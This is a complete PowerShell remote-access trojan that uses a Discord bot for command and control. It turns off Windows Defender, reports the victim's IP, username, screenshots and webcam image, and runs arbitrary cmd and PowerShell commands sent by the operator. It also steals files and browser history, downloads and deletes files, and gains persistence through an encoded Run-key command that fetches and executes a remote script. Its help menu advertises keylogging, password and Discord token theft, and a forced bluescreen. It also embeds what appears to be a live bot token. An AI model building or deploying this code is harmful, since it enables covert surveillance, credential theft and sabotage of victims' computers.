Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

#your bot token goes here
#EXAMPLE: $token = "MTA0ODE4MjEwMTA1MTQ2MDM3.AJif8F.9Uod-6ND1QAO38pwPJ7Ishvu5Eb"
$token = "MTMwNDQ1MjgyNjgxODQxNjcyMQ.GcFmZF.YcKJmk0eESp-bmWHjdx7mnGiG8VFxh026_Q0wc"

#your server id goes here
#example: $guildId = ""
$guildId = "1303133913803260076"

#put the url to your rcHack script (for persistance)
#you can host the file on github (make sure the repository is public)
#example: $StartupPsOnlineFileLocation = "HTTPS://WWW.EXAMPLE.COM/URL_TO_YOUR_RCHACK_SCRIPT.PS1"
$StartupPsOnlineFileLocation = "$env:LOCALAPPDATA\TempContent\mika.ps1"








$channel_id = $null
$last_message_id = $null
$global:dir = "$Env:USERPROFILE\Desktop"
$highestSession = $null
$adminState = $null
$uri = "https://discord.com/api/guilds/$guildId/channels"

$headers = @{
    "Authorization" = "Bot $token"
}

$webClient = New-Object System.Net.WebClient
$webClient.Headers.Add("Authorization", "Bot $token")
$response = $webClient.DownloadString($uri)
$channels = $response | ConvertFrom-Json
$highestSession = 0
foreach ($channel in $channels) {
    if ($channel.name -match "session-(\d+)") {
        $sessionNumber = [int]$matches[1]
        if ($sessionNumber -gt $highestSession) {
            $highestSession = $sessionNumber
        }
    }
}




#get channels to determine new channel name
$uri = "https://discord.com/api/guilds/$guildId/channels"

$headers = @{
    "Authorization" = "Bot $token"
}

$webClient = New-Object System.Net.WebClient
$webClient.Headers.Add("Authorization", "Bot $token")
$response = $webClient.DownloadString($uri)
$channels = $response | ConvertFrom-Json
$highestSession = 0
foreach ($channel in $channels) {
    if ($channel.name -match "session-(\d+)") {
        $sessionNumber = [int]$matches[1]
        if ($sessionNumber -gt $highestSession) {
            $highestSession = $sessionNumber
        }
    }
}
$highestSession




#create new channel
$newSessionNumber = $highestSession + 1;
$uri = "https://discord.com/api/guilds/$guildId/channels"
$body = @{
    "name" = "session-$newSessionNumber"
    "type" = 0
} | ConvertTo-Json

$headers = @{
    "Authorization" = "Bot $token"
    "Content-Type" = "application/json"
}

$webClient = New-Object System.Net.WebClient
$webClient.Headers.Add("Authorization", "Bot $token")
$webClient.Headers.Add("Content-Type", "application/json")

$response = $webClient.UploadString($uri, "POST", $body)
$responseObj = ConvertFrom-Json $response
Write-Host "The ID of the new channel is: $($responseObj.id)"
$channel_id = $responseObj.id;


#function to delete the channel
function Delete-Channel {
$baseUrl = "https://discord.com/api/v9"
$endpoint = "/channels/$channel_id"
$url = $baseUrl + $endpoint
$client = New-Object System.Net.WebClient
$client.Headers.Add("Authorization", "Bot $token")
$response = $client.UploadString($url, "DELETE", "")
Exit
}


#function to send messages back to discord
function Send-Discord {
    param(
        [string]$Message,
        [string]$AttachmentPath
    )

    $url = "https://discord.com/api/v9/channels/$channel_id/messages"
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("Authorization", "Bot $token")

    if ($Message) {
        $limitedMessage = $Message
        if ($Message.Length -gt 1900) {
            $limitedMessage = $Message.Substring(0, 1900)
        }
        $jsonBody = @{
            content = $limitedMessage
        } | ConvertTo-Json
        $webClient.Headers.Add("Content-Type", "application/json")
        $response = $webClient.UploadString($url, "POST", $jsonBody)
        Write-Host "Message sent to Discord: $limitedMessage"
    }

    if ($AttachmentPath) {
        if (Test-Path $AttachmentPath -PathType Leaf) {
        $response = $webClient.UploadFile($url, "POST", $AttachmentPath)
        Write-Host "Attachment sent to Discord: $AttachmentPath"
        Remove-Item $AttachmentPath -Force
        Write-Host "Attachment file deleted: $AttachmentPath"
    } else {
        Write-Host "File not found: $AttachmentPath"
        Send-Discord ('File not found: `' + $AttachmentPath + '`')
    }
    }

    $webClient.Dispose()
}



if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
    $adminState = "False"
    } else {
    $adminState = "True"
    }





#DiscordCommands
function DiscordCommand {
    param(
        [string]$DiscordCommandName,
        [string]$param
    )

    switch ($DiscordCommandName) {
        "cmd" {
    $result = Invoke-Expression "cmd /c $param"
    $output = $result -join "`n"
    Write-Host $output
    Send-Discord $output
}
        "powershell" { 
    $result = Invoke-Expression $param
    $output = $result -join "`n"
    Write-Host $output
    Send-Discord $output
}
        "dir"{
    $output = @()
    $items = Get-ChildItem -Path $global:dir
    $output += "Directory: $($global:dir)`n"
    foreach ($item in $items) {
    if ($item.PSIsContainer) {
    $output += "FOLDER - $($item.Name)"
    } else {
    $output += "FILE - $($item.Name)"}}
    Write-Host ($output -join "`n")
    Send-Discord ($output -join "`n")
}
        "cd" {
    $param = $param -replace '/', '\'
    if (Test-Path $param -PathType Container) {
    $global:dir = $param
    Write-Host "Changed current directory to $param"
    Send-Discord ('Changed current directory to `' + $param + '`')
    } elseif (Test-Path $param -PathType Leaf) {
    Write-Host "'$param' is not a directory."
    Send-Discord ('`' + $param + '` is not a directory.')
    } else {
    $fullPath = Join-Path -Path $global:dir -ChildPath $param
    if (Test-Path $fullPath -PathType Container) {
    $global:dir = $fullPath
    Write-Host "Changed current directory to $param"
    Send-Discord ('Changed current directory to `' + $param + '`')
    } elseif (Test-Path $fullPath -PathType Leaf) {
    Write-Host "'$fullPath' is not a directory."
    Send-Discord ('`' + $param + '` is not a directory.')
    } else {
    Write-Host "Directory '$fullPath' does not exist."
    Send-Discord ("Directory `'$fullPath`' does not exist.")}}
}
        "download" {
    if (Test-Path $param -PathType Leaf) {
    $fullPath = $param
    } else {
    $fullPath = Join-Path -Path $global:dir -ChildPath $param}
    if (Test-Path $fullPath -PathType Leaf) {
    Write-Host $fullPath
    Send-Discord -Attachment $fullPath
    } else {
    Write-Host "File location does not exist or is not a file."
    Send-Discord "File location does not exist or is not a file."}
}
        "upload" {
    $fileName = [System.IO.Path]::GetFileName($param) -replace '[?&].*'
    $outputPath = Join-Path -Path $global:dir -ChildPath $fileName
    Invoke-WebRequest -Uri $param -OutFile $outputPath  -UseBasicParsing
    if (Test-Path $outputPath) {
    Write-Host "File uploaded."
    } else {
    Write-Host "Unknown error, most likely failed."}
}
        "delete"{
            $param = $param -replace '/', '\'
            if (Test-Path $param -PathType Leaf) {
                $fullPath = $param
            } else {
                $fullPath = Join-Path -Path $global:dir -ChildPath $param
            }
            
            if (Test-Path $fullPath) {
                if (Test-Path $fullPath -PathType Leaf) {
                    Remove-Item -Path $fullPath -Force
                    Write-Host "File deleted: $fullPath"
                    Send-Discord "File deleted: $fullPath"
                } elseif (Test-Path $fullPath -PathType Container) {
                    Remove-Item -Path $fullPath -Recurse -Force
                    Write-Host "Directory deleted: $fullPath"
                    Send-Discord "Directory deleted: $fullPath"
                } else {
                    Write-Host "The path $fullPath does not point to a file or directory."
                    Send-Discord "The path $fullPath does not point to a file or directory."
                }
            } else {
                Write-Host "File location does not exist: $fullPath"
                Send-Discord "File location does not exist: $fullPath"
            }
            
}
        "screenshot" {
    $File = "$env:TEMP\screenshot.png"
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top        
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($File, [System.Drawing.Imaging.ImageFormat]::Png)
    Write-Host $File
    Send-Discord -AttachmentPath $File
}     
                "shutdown"{
    Write-Host "Shutting down."
    Send-Discord "Shutting down."
    Stop-Computer -Force
}
        "restart"{
    Write-Host "Restarting."
    Send-Discord "Restarting."
    Restart-Computer -Force
}
        "logoff"{
    Write-Host "Logging off."
    Send-Discord "Logging off."
    shutdown.exe /l
}
                "ip" {
    $ip = (ipconfig | Select-String "IPv4 Address").ToString() -replace '.*?(\d+\.\d+\.\d+\.\d+).*', '$1'
    Write-Host $ip
    Send-Discord ``$ip``
}
        "browserdata"{
    function Get-BrowserData {
    [CmdletBinding()]
    param (
    [Parameter(Position=1, Mandatory = $True)]
    [string]$Browser,    
    [Parameter(Position=2, Mandatory = $True)]
    [string]$DataType) 
    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"}
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"}
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"}
    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} | Sort -Unique
    $Value | ForEach-Object {
    $Key = $_
    New-Object -TypeName PSObject -Property @{
    User = $env:UserName
    Browser = $Browser
    DataType = $DataType
    Data = $_}}}
    $filePath = "$env:TEMP\browserdata.txt"
    Get-BrowserData -Browser "edge" -DataType "history" | Out-File -Append -FilePath $filePath
    Get-BrowserData -Browser "edge" -DataType "bookmarks" | Out-File -Append -FilePath $filePath
    Get-BrowserData -Browser "chrome" -DataType "history" | Out-File -Append -FilePath $filePath
    Get-BrowserData -Browser "chrome" -DataType "bookmarks" | Out-File -Append -FilePath $filePath
    Get-BrowserData -Browser "firefox" -DataType "history" | Out-File -Append -FilePath $filePath
    Get-BrowserData -Browser "opera" -DataType "history" | Out-File -Append -FilePath $filePath
    Get-BrowserData -Browser "opera" -DataType "bookmarks" | Out-File -Append -FilePath $filePath
    Write-Host $filePath
    Send-Discord -Attachment $filePath
}
        "startup"{
$scriptContent = @"
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring 1";
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr -useb '$StartupPsOnlineFileLocation' | iex"
"@
$encodedScript = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($scriptContent))
$scriptCommand = "powershell.exe -EncodedCommand $encodedScript"

$regKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regKeyName = "rcHack"
New-ItemProperty -Path $regKeyPath -Name $regKeyName -Value $scriptCommand -PropertyType String -Force

}
    "help" {
    $content = @"
COMMAND_NAME                           |                           PARAMETERS
--------------------------------------------------------------------------------
If you see 'Requires admin.', that means the script wasn't run as administrator.
--------------------------------------------------------------------------------
E          X          A          M          P          L          E          S

1. !cmd               // Executes a command in cmd and returns the output
   Example: !cmd ipconfig

2. !powershell        // Executes a command in PowerShell and returns the output
   Example: !powershell ipconfig

3. !dir               // Displays the current directory
   Example: !dir

4. !cd                // Changes the current directory
   Example: !cd C:\location\of\file

5. !download          // Downloads a file from a specified location or current directory
   Example: !download C:\location\of\file\file.txt
   Example: !download file.txt

6. !upload {ATTACHMENT} // Uploads any attachment to the current directory
   Example: !upload {ATTACHMENT}

7. !delete            // Deletes a specified file or directory
   Example: !delete C:\location\of\file\file.txt

8. !availwifi         // Retrieves available Wi-Fi networks
   Example: !availwifi

9. !wifipass          // Retrieves Wi-Fi passwords
   Example: !wifipass

10. !screenshot        // Captures a screenshot of the victim's screen
    Example: !screenshot

11. !webcampic         // Captures and returns a picture from the webcam
    Example: !webcampic

12. !wallpaper         // Changes the wallpaper of the victim's computer
    Example: !wallpaper C:\path\to\wallpaper.jpg

13. !keylogger         // Activates keylogger to record keystrokes
    Example: !keylogger

14. !getkeylog         // Retrieves the logged keystrokes
    Example: !getkeylog

15. !voicelogger       // Activates voicelogger to transcribe spoken words
    Example: !voicelogger

16. !getvoicelog       // Retrieves the logged voice recordings
    Example: !getvoicelog

17. !disabledefender   // Disables Windows Defender
    Example: !disabledefender

18. !disablefirewall   // Disables the Windows Firewall
    Example: !disablefirewall

19. !shutdown          // Shuts down the victim's computer
    Example: !shutdown

20. !restart           // Restarts the victim's computer
    Example: !restart

21. !logoff            // Logs off the user from the victim's computer
    Example: !logoff

22. !msgbox            // Displays a customizable message box
    Example: !msgbox TITLE_HERE,MESSAGE_HERE,Warning,YesNoCancel

23. !hackergoose       // Employs a specialized goose for real-time hacking
    Example: !hackergoose

24. !website           // Opens a specified website
    Example: !website www.example.com

25. !minapps           // Minimizes all windows on the victim's computer
    Example: !minapps

26. !ip                // Retrieves the victim's IP address
    Example: !ip

27. !passwords          // Retrieves the victim's saved passwords
    Example: !passwords

28. !tokengrabber       //Retrieves discord tokens
    Example: !tokengrabber

29. !browserdata       // Retrieves browser data
    Example: !browserdata

30. !networkscan       // Scans and retrieves information about the network
    Example: !networkscan

31. !volume            // Adjusts the volume of the victim's computer
    Example: !volume 50

32. !voice             // Makes the victim's computer speak a specified message
    Example: !voice You are hacked!

33. !proclist       // Retrieves a list of all running processes
    Example: !proclist

34. !prockill          // Terminates a specified process
    Example: !prockill process_name.exe

35. !write             // Types a specified message
    Example: !write Hello, world!

36. !clipboard         // Retrieves the last copied item
    Example: !clipboard

37. !idletime          // Retrieves the duration of the victim's idle time in seconds
    Example: !idletime

38. !datetime          // Retrieves the date and time of the victim's computer
    Example: !datetime

39. !bluescreen        // Triggers a blue screen on the victim's computer
    Example: !bluescreen

40. !geolocate         // Retrieves the victim's geolocation data
    Example: !geolocate

41. !block             // Blocks the victim's keyboard and mouse (requires admin)
    Example: !block

42. !unblock           // Unblocks the victim's keyboard and mouse (requires admin)
    Example: !unblock

43. !disabletaskmgr    // Disables Task Manager (requires admin)
    Example: !disabletaskmgr

44. !enabletaskmgr     // Enables Task Manager (requires admin)
    Example: !enabletaskmgr

45. !admin             //attempts to replace session with admin (shows prompt)
    Example: !admin

46. !startup           // Enables persistence for this script
        will add a ps1 script to startup
        on line 9, set the var StartupPsOnlineFileLocation to the full url of your ps1 file
    Example: !startup

47. !implode           // Triggers a system implosion (Leaves no trace)
    Example: !implode

48. !help              // Displays information about available commands
    Example: !help
"@
    Set-Content -Path "$env:TEMP\help.txt" -Value $content
    Write-Host "$env:TEMP\help.txt"
    Send-Discord -Attachment "$env:TEMP\help.txt"
}
        Default {
    Write-Host "Unknown DiscordCommand: $DiscordCommandName"
    Send-Discord ('Unknown DiscordCommand: `' + $DiscordCommandName + '`')
}
}}






#Computer Info Header;
$ip = (ipconfig | Select-String "IPv4 Address").ToString() -replace '.*?(\d+\.\d+\.\d+\.\d+).*', '$1'
$ip = "``$ip``"
$username = "``$env:USERNAME``"
$adminState = "``$adminState``"
$ComputerInfoHeader = "Device: $ip connected, Username: $username, Admin: $adminState"
Send-Discord $ComputerInfoHeader
DiscordCommand -DiscordCommandName screenshot
DiscordCommand -DiscordCommandName webcampic





Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
#incoming command loop
while ($true) {
    $headers = @{
        'Authorization' = "Bot $token"
    }

    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("Authorization", $headers.Authorization)

    $url = if ($last_message_id) {
        "https://discord.com/api/v9/channels/$channel_id/messages?after=$last_message_id"
    } else {
        "https://discord.com/api/v9/channels/$channel_id/messages"
    }

    $response = $webClient.DownloadString($url)

    if ($response) {
        $messages = ($response | ConvertFrom-Json)
        if ($messages.Count -gt 0) {

            $message = ($response | ConvertFrom-Json)[0]
            if ($message.content -match '^!') {
                $last_message_id = $message.id
                $attachmentURL = $null
                if ($message.attachments.Count -gt 0) {
                    $attachmentURL = $message.attachments[0].url
                }

                if ($message.content -match '^!(\S+)') {
                    $command = $matches[1]
                    if ($attachmentURL) {
                        $param = $attachmentURL
                    } else {
                        $param = $message.content -replace '^!\S+\s*', ''
                    }
                    #run the command with its param
                    DiscordCommand -DiscordCommandName $command -param $param
                }
            }
        }
    }

    Start-Sleep -Seconds 1
}